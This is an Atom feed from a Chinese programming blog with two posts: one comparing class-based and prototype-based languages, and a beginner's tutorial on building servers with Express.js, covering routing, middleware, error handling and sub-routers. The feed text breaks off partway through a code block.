<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Leslie Waong</title>
  
  <subtitle>Lesliewaongの博客</subtitle>
  <link href="https://lesliewaong.top/atom.xml" rel="self"/>
  
  <link href="https://lesliewaong.top/"/>
  <updated>2022-03-26T07:15:42.697Z</updated>
  <id>https://lesliewaong.top/</id>
  
  <author>
    <name>Leslie Waong</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基于类 vs 基于原型的语言</title>
    <link href="https://lesliewaong.top/posts/f0ca7a3c.html"/>
    <id>https://lesliewaong.top/posts/f0ca7a3c.html</id>
    <published>2022-03-22T03:32:47.000Z</published>
    <updated>2022-03-26T07:15:42.697Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于类-vs-基于原型的语言"><a href="#基于类-vs-基于原型的语言" class="headerlink" title="基于类 vs 基于原型的语言"></a>基于类 vs 基于原型的语言</h1><p><strong>基于类的面向对象语言</strong>，比如 Java 和 C++，是构建在两个不同实体之上的：类和实例。</p><ul><li>一个<strong>类(class)<strong>定义了</strong>某一对象集合所具有的特征性属性</strong>（可以将 Java 中的方法和域以及 C++ 中的成员都视作属性）。<strong>类是抽象的，而不是其所描述的对象集合中的任何特定的个体。</strong>例如 <code>Employee</code> 类可以用来表示所有雇员的集合。</li><li>另一方面，<strong>一个实例(instance)是一个类的实例化</strong>。例如， <code>Victoria</code> 可以是 <code>Employee</code> 类的一个实例，表示一个特定的雇员个体。<strong>实例具有和其父类完全一致的属性</strong>，不多也不少。</li></ul><p><strong>基于原型的语言（如 JavaScript）</strong>并不存在这种区别：它<strong>只有对象</strong>。</p><p>基于原型的语言具有所谓**原型对象(prototypical object)**的概念。</p><p><strong>原型对象可以作为一个模板，新对象可以从中获得原始的属性。</strong></p><p>任何对象都可以指定其自身的属性，既可以是创建时也可以在运行时创建。</p><p>而且，<strong>任何对象都可以作为另一个对象的原型(prototype)，从而允许后者共享前者的属性</strong>。</p><h2 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h2><p>在基于类的语言中，需要专门的<strong>类定义(class definition)来定义类</strong>。</p><p>在定义类时，允许定义被称为<strong>构造器(constructor)的特殊的方法来创建该类的实例</strong>。</p><p>在构造器方法中，可以指定实例的属性的初始值并做一些其他的操作。你可以通过使用 <code>new</code> 操作符来创建类的实例。</p><p>JavaScript 大体上与之类似，但并<strong>没有专门的类定义</strong>，你通过<strong>定义构造函数的方式来创建一系列有着特定初始值和方法的对象</strong>。</p><p>任何JavaScript函数都可以被用作构造函数。你也可以使用 <code>new</code> 操作符来创建一个新对象。</p><p><strong>备注：</strong>在<strong>ES6</strong>中引入了类定义，但它实际上是<strong>已有的原型继承方式的语法糖而已，并没有引入新的面向对象继承模型</strong>。</p><h2 id="子类和继承"><a href="#子类和继承" class="headerlink" title="子类和继承"></a>子类和继承</h2><p>基于类的语言是通过对类的定义中构建类的层级结构的。</p><p>在类定义中，可以指定新的类是一个现存的类的子类。子类将继承父类的全部属性，并可以添加新的属性或者修改继承的属性。</p><p>例如，假设 <code>Employee</code> 类只有 <code>name</code> 和 <code>dept</code> 属性，而 <code>Manager</code> 是 <code>Employee</code> 的子类并添加了 <code>reports</code> 属性。这时，<code>Manager</code> 类的实例将具有所有三个属性：<code>name</code>，<code>dept</code>和<code>reports</code>。</p><p>JavaScript 通过将构造器函数与原型对象相关联的方式来实现继承。这样，您可以创建完全一样的 <code>Employee</code> — <code>Manager</code> 示例，不过需要使用略微不同的术语。</p><p>首先，定义Employee构造函数，在该构造函数内定义name、dept属性；接下来，定义Manager构造函数，在该构造函数内调用Employee构造函数，并定义reports属性；最后，将一个获得了Employee.prototype(Employee构造函数原型)的新对象赋予manager构造函数，以作为Manager构造函数的原型。之后当你创建新的Manager对象实例时，该实例会从Employee对象继承name、dept属性。</p><h2 id="添加和移除属性"><a href="#添加和移除属性" class="headerlink" title="添加和移除属性"></a>添加和移除属性</h2><p>在基于类的语言中，通常在编译时创建类，然后在编译时或者运行时对类的实例进行实例化。一旦定义了类，无法对类的属性进行更改。</p><p>然而，在 JavaScript 中，允许运行时添加或者移除任何对象的属性。如果您为一个对象中添加了一个属性，而这个对象又作为其它对象的原型，则以该对象作为原型的所有其它对象也将获得该属性。</p><h2 id="差异总结"><a href="#差异总结" class="headerlink" title="差异总结"></a>差异总结</h2><p>下面的表格摘要给出了上述区别。本节的后续部分将描述有关使用 JavaScript 构造器和原型创建对象层级结构的详细信息，并将其与在 Java 中的做法加以对比。</p><table><thead><tr><th align="left">基于类的（Java）</th><th align="left">基于原型的（JavaScript）</th></tr></thead><tbody><tr><td align="left">类和实例是不同的事物。</td><td align="left">所有对象均为实例。</td></tr><tr><td align="left">通过类定义来定义类；通过构造器方法来实例化类。</td><td align="left">通过构造器函数来定义和创建一组对象。</td></tr><tr><td align="left">通过 <code>new</code> 操作符创建单个对象。</td><td align="left">相同。</td></tr><tr><td align="left">通过类定义来定义现存类的子类，从而构建对象的层级结构。</td><td align="left">指定一个对象作为原型并且与构造函数一起构建对象的层级结构</td></tr><tr><td align="left">遵循类链继承属性。</td><td align="left">遵循原型链继承属性。</td></tr><tr><td align="left">类定义指定类的所有实例的<strong>所有</strong>属性。无法在运行时动态添加属性。</td><td align="left">构造器函数或原型指定实例的<strong>初始</strong>属性集。允许动态地向单个的对象或者整个对象集中添加或移除属性。</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基于类-vs-基于原型的语言&quot;&gt;&lt;a href=&quot;#基于类-vs-基于原型的语言&quot; class=&quot;headerlink&quot; title=&quot;基于类 vs 基于原型的语言&quot;&gt;&lt;/a&gt;基于类 vs 基于原型的语言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;基于类的面向对象语言&lt;/st</summary>
      
    
    
    
    <category term="JS" scheme="https://lesliewaong.top/categories/JS/"/>
    
    
    <category term="类" scheme="https://lesliewaong.top/tags/%E7%B1%BB/"/>
    
    <category term="原型" scheme="https://lesliewaong.top/tags/%E5%8E%9F%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>Express</title>
    <link href="https://lesliewaong.top/posts/d7c881ac.html"/>
    <id>https://lesliewaong.top/posts/d7c881ac.html</id>
    <published>2022-03-15T08:11:03.000Z</published>
    <updated>2022-03-25T14:08:26.390Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h1><p>直接用Node.js内置的 http 模块去开发服务器有以下明显的弊端：</p><ul><li><strong>需要写很多底层代码</strong>——例如手动指定 HTTP 状态码和头部字段，最终返回内容。如果我们需要开发更复杂的功能，涉及到多种状态码和头部信息（例如用户鉴权），这样的手动管理模式非常不方便</li><li><strong>没有专门的路由机制</strong>——路由是服务器最重要的功能之一，通过路由才能根据客户端的不同请求 URL 及 HTTP 方法来返回相应内容。但是上面这段代码只能在 <code>http.createServer</code> 的回调函数中通过判断请求 <code>req</code> 的内容才能实现路由功能，搭建大型应用时力不从心</li></ul><p>由此就引出了 Express 对内置 http 的两大封装和改进：</p><ul><li>更强大的请求（Request）和响应（Response）对象，添加了很多实用方法</li><li>灵活方便的路由的定义与解析，能够很方便地进行代码拆分</li></ul><h2 id="用-Express-搭建服务器"><a href="#用-Express-搭建服务器" class="headerlink" title="用 Express 搭建服务器"></a>用 Express 搭建服务器</h2><p>在第一步中，我们把服务器放在了一个JS文件中，也就是一个Node模块。从现在开始，我们将把这个项目变成一个npm项目。输入以下命令创建 npm 项目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><p>接着你可以一路回车下去（当然也可以仔细填），就会发现 package.json 文件已经创建好了。然后添加 Express 项目依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install express</span><br></pre></td></tr></table></figure><p>在开始用 Express 改写上面的服务器之前，我们先介绍一下上面提到的<strong>两大封装与改进</strong>。</p><h2 id="更强大的-Request-和-Response-对象"><a href="#更强大的-Request-和-Response-对象" class="headerlink" title="更强大的 Request 和 Response 对象"></a>更强大的 Request 和 Response 对象</h2><p>首先是 Request 请求对象，通常我们习惯用 <code>req</code> 变量来表示。下面列举一些 <code>req</code> 上比较重要的成员：</p><ul><li><code>req.body</code>：客户端请求体的<strong>数据</strong>，可能是表单或 JSON 数据</li><li><code>req.params</code>：请求 URI 中的<strong>路径</strong>参数</li><li><code>req.query</code>：请求 URI 中的<strong>查询</strong>参数</li><li><code>req.cookies</code>：客户端的 <code>cookies</code></li></ul><p>然后是 Response 响应对象，通常用 <code>res</code> 变量来表示，可以执行一系列响应操作，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送一串 HTML 代码</span></span><br><span class="line">res.send(<span class="string">&#x27;HTML String&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送一个文件</span></span><br><span class="line">res.sendFile(<span class="string">&#x27;file.zip&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染一个模板引擎并发送</span></span><br><span class="line">res.render(<span class="string">&#x27;index&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Response 对象上的操作非常丰富，并且还可以链式调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置状态码为 404，并返回 Page Not Found 字符串</span></span><br><span class="line">res.status(<span class="number">404</span>).send(<span class="string">&#x27;Page Not Found&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>res.end() 和 res.send()</p></blockquote><p>相同点：</p><ul><li>二者最终都是回归到  <code>http.ServerResponse.Use</code> 的 <code>response.end()</code> 方法。</li><li>二者都会结束当前响应流程。</li></ul><p>不同点：</p><ul><li>前者只能发送 string 或者 Buffer 类型，后者可以发送任何类型数据。</li><li>从语义来看，前者更适合没有任何响应数据的场景，而后者更适合于存在响应数据的场景。</li></ul><p>Express 的 res.end() 和 res.send() 方法使用上，一般建议使用 <code>res.send()</code>方法即可，这样就不需要关心响应数据的格式，因为 Express 内部对数据进行了处理。</p><h2 id="路由机制"><a href="#路由机制" class="headerlink" title="路由机制"></a>路由机制</h2><p>客户端（包括 Web 前端、移动端等等）向服务器发起请求时包括两个元素：<strong>路径</strong>（URI）以及 <strong>HTTP 请求方法</strong>（包括 GET、POST 等等）。路径和请求方法合起来一般被称为 API 端点（Endpoint）。而服务器根据客户端访问的端点选择相应处理逻辑的机制就叫做路由。</p><p>在 Express 中，定义路由只需按下面这样的形式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.METHOD(PATH, HANDLER)</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>app</code> 就是一个 <code>express</code> 服务器对象</li><li><code>METHOD</code> 可以是任何<strong>小写</strong>的 HTTP 请求方法，包括 <code>get</code>、<code>post</code>、<code>put</code>、<code>delete</code> 等等</li><li><code>PATH</code> 是客户端访问的 URI，例如 <code>/</code> 或 <code>/about</code></li><li><code>HANDLER</code> 是路由被触发时的回调函数，在函数中可以执行相应的业务逻辑</li></ul><p>nodemon 加速开发</p><p><a href="https://link.juejin.cn/?target=https://www.npmjs.com/package/nodemon">Nodemon</a> 是一款颇受欢迎的开发服务器，能够检测工作区代码的变化，并自动重启。通过以下命令安装 nodemon：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install nodemon --save-dev</span><br></pre></td></tr></table></figure><h2 id="正式实现"><a href="#正式实现" class="headerlink" title="正式实现"></a>正式实现</h2><p>到了动手的时候了，我们用 Express 改写上面的服务器，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hostname = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.send(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server running at http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在上面的代码中，我们首先用 <code>express()</code> 函数创建一个 Express 服务器对象，然后用上面提到的路由定义方法 <code>app.get</code> 定义了主页 <code>/</code> 的路由，最后同样调用 <code>listen</code> 方法开启服务器。</p><p>从这一步开始，我们运行 <code>npm start</code> 命令即可开启服务器，并且同样可以看到 Hello World 的内容，但是代码却简单明了了不少。</p><p><strong>提示</strong></p><p>在运行 <code>npm start</code> 之后，可以让服务器一直打开着，编辑代码并保存后，<code>Nodemon</code> 就会自动重启服务器，运行最新的代码。如果不能自动重启，可以<code>Ctrl+c</code>关闭后手动重启。</p><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p>接下来我们开始讲解 Express 第二个重要的概念：<strong>中间件</strong>（Middleware）。</p><h3 id="理解中间件"><a href="#理解中间件" class="headerlink" title="理解中间件"></a>理解中间件</h3><p>中间件并不是 Express 独有的概念。相反，它是一种广为使用的软件工程概念（甚至已经延伸到了其他行业），是指<strong>将具体的业务逻辑和底层逻辑解耦的组件</strong>。换句话说，中间件就是能够适用多个应用场景、可复用性良好的代码。</p><p>Express 的简化版中间件流程如下图所示：</p><p><a href="https://imgtu.com/i/HLcYqK"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/02/20/HLcYqK.png" alt="HLcYqK.png"></a></p><p>首先客户端向服务器发起请求，然后服务器依次执行每个中间件，最后到达路由，选择相应的逻辑来执行。</p><p>有两点需要特别注意：</p><ul><li>中间件是<strong>按顺序执行</strong>的，因此在配置中间件时顺序非常重要，不能弄错</li><li>中间件在执行内部逻辑的时候可以选择将请求传递给下一个中间件，也可以直接返回用户响应</li></ul><h3 id="Express-中间件的定义"><a href="#Express-中间件的定义" class="headerlink" title="Express 中间件的定义"></a>Express 中间件的定义</h3><p>在 Express 中，中间件就是一个函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">someMiddleware</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 自定义逻辑</span></span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个参数中，<code>req</code> 和 <code>res</code> 就是前面提到的 Request 请求对象和 Response 响应对象；而 <code>next</code> 函数则用来触发下一个中间件的执行。</p><blockquote><p><strong>注意</strong></p><p>如果忘记在中间件中调用 <code>next</code> 函数，并且又不直接返回响应时，服务器会直接卡在这个中间件不会继续执行下去哦！</p></blockquote><p>在 Express 使用中间件有两种方式：<strong>全局中间件</strong>和<strong>路由中间件</strong>。</p><h3 id="全局中间件"><a href="#全局中间件" class="headerlink" title="全局中间件"></a>全局中间件</h3><p>通过 <code>app.use</code> 函数就可以注册中间件，并且此中间件会在用户发起<strong>任何请求</strong>都可能会执行，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(someMiddleware);</span><br></pre></td></tr></table></figure><h3 id="路由中间件"><a href="#路由中间件" class="headerlink" title="路由中间件"></a>路由中间件</h3><p>通过在路由定义时注册中间件，此中间件只会在用户访问该路由对应的 URI 时执行，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/middleware&#x27;</span>, someMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.send(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>那么用户只有在访问 <code>/middleware</code> 时，定义的 <code>someMiddleware</code> 中间件才会被触发，访问其他路径时不会触发。</p><h3 id="编写中间件"><a href="#编写中间件" class="headerlink" title="编写中间件"></a>编写中间件</h3><p>接下来我们就开始实现第一个 Express 中间件。功能很简单，就是在终端打印客户端的访问时间、 HTTP 请求方法和 URI，名为 <code>loggingMiddleware</code>。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loggingMiddleware</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;time.toLocaleString()&#125;</span>] <span class="subst">$&#123;req.method&#125;</span> <span class="subst">$&#123;req.url&#125;</span>`</span>);</span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(loggingMiddleware);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.send(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong></p><p>在中间件中写 <code>console.log</code> 语句是比较糟糕的做法，因为 <code>console.log</code>（包括其他同步的代码）都会阻塞 Node.js 的异步事件循环，降低服务器的吞吐率。在实际生产中，推荐使用第三方优秀的日志中间件，例如 <a href="https://link.juejin.cn/?target=https://www.npmjs.com/package/morgan">morgan</a>、<a href="https://link.juejin.cn/?target=https://www.npmjs.com/package/winston">winston</a> 等等。</p></blockquote><p>实际上，中间件不仅可以读取 <code>req</code> 对象上的各个属性，还可以添加新的属性或修改已有的属性（后面的中间件和路由函数都可以获取），能够很方便地实现一些复杂的业务逻辑（例如用户鉴权）。</p><h2 id="添加静态文件服务"><a href="#添加静态文件服务" class="headerlink" title="添加静态文件服务"></a>添加静态文件服务</h2><p>通常网站需要提供静态文件服务，例如图片、CSS 文件、JS 文件等等，而 Express 已经自带了静态文件服务中间件 <code>express.static</code>，使用起来非常方便。</p><p>例如，我们添加静态文件中间件如下，并指定静态资源根目录为 <code>public</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.use(express.static(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p><code>app.use(express.static(__dirname))</code>，假设我在server.js文件中写入这行代码，那么就是把server.js文件所在的目录设置为静态文件目录。该目录下的<code>index.html</code>会被默认打开。</p><h2 id="处理-404-和服务器错误"><a href="#处理-404-和服务器错误" class="headerlink" title="处理 404 和服务器错误"></a>处理 404 和服务器错误</h2><p><a href="https://imgtu.com/i/HLcJr6"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/02/20/HLcJr6.png" alt="HLcJr6.png"></a></p><p>这张示意图和之前的图有两点重大区别：</p><ul><li>每个路由定义本质上是一个<strong>中间件</strong>（更准确地说是一个<strong>中间件容器</strong>，可包含多个中间件），当 URI 匹配成功时直接返回响应，匹配失败时继续执行下一个路由</li><li>每个中间件（包括路由）不仅可以调用 <code>next</code> 函数向下传递、直接返回响应，还可以<strong>抛出异常</strong></li></ul><p>从这张图就可以很清晰地看出怎么实现 404 和服务器错误的处理了：</p><ul><li>对于 404，只需在所有路由之后再加一个中间件，用来接收所有路由均匹配失败的请求</li><li>对于错误处理，前面所有中间件抛出异常时都会进入错误处理函数，可以使用 Express 自带的，也可以自定义。</li></ul><h3 id="处理-404"><a href="#处理-404" class="headerlink" title="处理 404"></a>处理 404</h3><p>在 Express 中，可以通过中间件的方式处理访问不存在的路径：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">&#x27;*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>*</code> 表示匹配任何路径。将此中间件放在所有路由后面，即可捕获所有访问路径均匹配失败的请求。</p><h3 id="处理内部错误"><a href="#处理内部错误" class="headerlink" title="处理内部错误"></a>处理内部错误</h3><p>Express 已经自带了错误处理机制，我们先来体验一下。在 server.js 中添加下面这条”坏掉“的路由（模拟现实中出错的情形）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/broken&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Broken!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p><strong>危险！</strong></p><p>服务器直接返回了出错的调用栈！很明显，向用户返回这样的调用栈不仅体验糟糕，而且大大增加了被攻击的风险。</p></blockquote><p>实际上，Express 的默认错误处理机制可以通过设置 <code>NODE_ENV</code> 来进行切换。我们将其设置为生产环境 <code>production</code>，再开启服务器。如果你在 Linux、macOS 或 Windows 下的 Git Bash 环境中，可以运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NODE_ENV=production node server.js</span><br></pre></td></tr></table></figure><p>如果你在 Windows 下的命令行，运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> NODE_ENV=production</span><br><span class="line">node server.js</span><br></pre></td></tr></table></figure><p>这时候访问 <code>localhost:3000/broken</code> 就会直接返回 Internal Server Error（服务器内部错误），不会显示任何错误信息。</p><p>体验还是很不好，更理想的情况是能够返回一个友好的自定义页面。这可以通过 Express 的自定义错误处理函数来解决，错误处理函数的形式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理错误逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和普通的中间件函数相比，多了第一个参数，也就是 <code>err</code> 异常对象。</p><h2 id="实现自定义处理逻辑"><a href="#实现自定义处理逻辑" class="headerlink" title="实现自定义处理逻辑"></a>实现自定义处理逻辑</h2><p>通过上面的讲解，实现自定义的 404 和错误处理逻辑也就非常简单了。在 server.js 所有路由的后面添加如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中间件和其他路由 ...</span></span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.status(<span class="number">404</span>).render(<span class="string">&#x27;404&#x27;</span>, &#123; <span class="attr">url</span>: req.originalUrl &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).render(<span class="string">&#x27;500&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server running at http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p><strong>提示</strong></p><p>在编写处理 404 的逻辑时，我们用到了模板引擎中的变量插值功能。具体而言，在 <code>res.render</code> 方法中将需要传给模板的数据作为第二个参数（例如这里的 <code>&#123; url: req.originalUrl &#125;</code> 传入了用户访问的路径），在模板中就可以通过 <code>&#123;&#123; url &#125;&#125;</code> 获取数据了。</p></blockquote><h2 id="JSON-API"><a href="#JSON-API" class="headerlink" title="JSON API"></a>JSON API</h2><p>在之前提到的 Response 对象中，Express 为我们封装了一个 <code>json</code> 方法，直接就可以将一个 JavaScript 对象作为 JSON 数据返回，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.json(&#123; <span class="attr">name</span>: <span class="string">&#x27;百万年薪&#x27;</span>, <span class="attr">price</span>: <span class="number">996</span> &#125;);</span><br></pre></td></tr></table></figure><p>会返回 JSON 数据 <code>&#123; &quot;name&quot;: &quot;百万年薪&quot;, &quot;price&quot;: 996 &#125;</code>，状态码默认为 200。我们还可以指定状态码，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.status(<span class="number">502</span>).json(&#123; <span class="attr">error</span>: <span class="string">&#x27;公司关门了&#x27;</span> &#125;);</span><br></pre></td></tr></table></figure><p>会返回 JSON 数据 <code>&#123; &quot;error&quot;: &quot;公司关门了&quot;&#125;</code>，状态码为 502。</p><h2 id="使用子路由拆分逻辑"><a href="#使用子路由拆分逻辑" class="headerlink" title="使用子路由拆分逻辑"></a>使用子路由拆分逻辑</h2><p>当我们的网站规模越来越大时，把所有代码都放在 server.js 中可不是一个好主意。“拆分逻辑”（或者说“模块化”）是最常见的做法，而在 Express 中，我们可以通过子路由 <code>Router</code> 来实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.Router();</span><br></pre></td></tr></table></figure><p><code>express.Router</code> 可以理解为一个迷你版的 <code>app</code> 对象，但是它功能完备，同样支持注册中间件和路由：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册一个中间件</span></span><br><span class="line">router.use(someMiddleware);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加路由</span></span><br><span class="line">router.get(<span class="string">&#x27;/hello&#x27;</span>, helloHandler);</span><br><span class="line">router.post(<span class="string">&#x27;/world&#x27;</span>, worldHandler);</span><br></pre></td></tr></table></figure><p>最后，由于 Express 中“万物皆中间件”的思想，一个 <code>Router</code> 也作为中间件加入到 <code>app</code> 中:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span 